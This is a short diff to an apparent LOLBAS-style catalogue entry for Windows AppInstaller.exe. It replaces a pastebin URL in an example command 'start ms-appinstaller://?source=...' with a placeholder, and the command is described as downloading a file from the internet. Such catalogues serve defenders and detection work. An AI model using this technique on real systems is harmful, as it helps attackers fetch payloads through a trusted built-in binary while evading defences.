@@ -4,7 +4,7 @@ Description: Tool used for installation of AppX/MSIX applications on Windows 10
 Author: 'Wade Hickey'
 Created: 2020-12-02
 Commands:
-  - Command: start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
+  - Command: start ms-appinstaller://?source={REMOTEURL:.exe}
     Description: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache.
     Usecase: Download file from Internet
     Category: Download
